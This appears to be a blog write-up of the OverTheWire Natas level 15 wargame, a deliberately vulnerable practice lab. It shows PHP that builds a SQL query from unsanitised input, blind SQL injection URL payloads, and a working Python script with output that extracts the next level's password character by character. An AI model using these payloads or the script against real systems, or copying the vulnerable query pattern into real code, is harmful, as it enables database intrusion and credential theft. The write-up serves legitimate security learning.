---
layout: post
title:  "Natas15: Bruteforcing Blind SQLi"
date:   2017-08-3 14:15:50 -0400
categories: master
---

The source code:

```
/*
CREATE TABLE `users` (
  `username` varchar(64) DEFAULT NULL,
  `password` varchar(64) DEFAULT NULL
);
*/

if(array_key_exists("username", $_REQUEST)) {
    $link = mysql_connect('localhost', 'natas15', '<censored>');
    mysql_select_db('natas15', $link);
    
    $query = "SELECT * from users where username=\"".$_REQUEST["username"]."\"";
    if(array_key_exists("debug", $_GET)) {
        echo "Executing query: $query<br>";
    }

    $res = mysql_query($query, $link);
    if($res) {
    if(mysql_num_rows($res) > 0) {
        echo "This user exists.<br>";
    } else {
        echo "This user doesn't exist.<br>";
    }
    } else {
        echo "Error in query.<br>";
    }

    mysql_close($link);
} else {
?>

<form action="index.php" method="POST">
Username: <input name="username"><br>
<input type="submit" value="Check existence" />
</form>
<? } ?>
<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
</div>
</body>
</html> 
```

This level checks if a particular username exists in the `username` database. If the variable `debug` is included, then it will print a debugging string, which will be helpful to us. The comment in the source code reveals that there is also a password database.

After some testing, both bob and natas16 exists in the database. Let's craft an SQL injection. The following url:
```
http://natas15.natas.labs.overthewire.org/index.php?debug=1&username=natas16" and "1"="1
```
returns:
```
Executing query: SELECT * from users where username="natas16" and "1"="1"
This user exists.
```

We have a valid SQL injection, and now we need to find a way to retrieve the password. The SQL `LIKE` operator serves as a rudimentary regex statement. We can use this to craft a simple brute-forcing program to retrieve the password. The `%` wildcard matches zero or more characters. 

As an example, the url:
```
natas15.natas.labs.overthewire.org/index.php?debug=1&username=natas16" and password like "%c%" and "1"="1
```
returns:
```
Executing query: SELECT * from users where username="natas16" and password like "%c%" and "1"="1"
This user exists.
```
Which means that 'c' exists somewhere in the password of natas16. We can use this to craft a program to brute-force the password one character at a time.The SQL command `like binary` will make our search case-sensitive.

The code below is a simple python brute-forcer that will help us crack the password.
```
import requests

password = ""
array = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"

for i in range(0, 32): #password is 32 characters long
        for j in range(0, len(array)):
                password += array[j]
                sqli = 'natas16" and password like binary "' + password + '%" and "1"="1'
                req = requests.post("http://natas15.natas.labs.overthewire.org/index.php?debug=1",
                        auth=('natas15', 'AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J'), data={'username':sqli})
                if "user exists" in req.text:
                        print("password: " + password)
                        break
                else:
                        password = password[:-1]
```
After some time, the script will return the following:
```
password: W
password: Wa
password: WaI
password: WaIH
password: WaIHE
password: WaIHEa
password: WaIHEac
password: WaIHEacj
password: WaIHEacj6
password: WaIHEacj63
password: WaIHEacj63w
password: WaIHEacj63wn
password: WaIHEacj63wnN
password: WaIHEacj63wnNI
```

And so on. Once it finishes brute-forcing all 32 characters, we'll have the password for the next level.



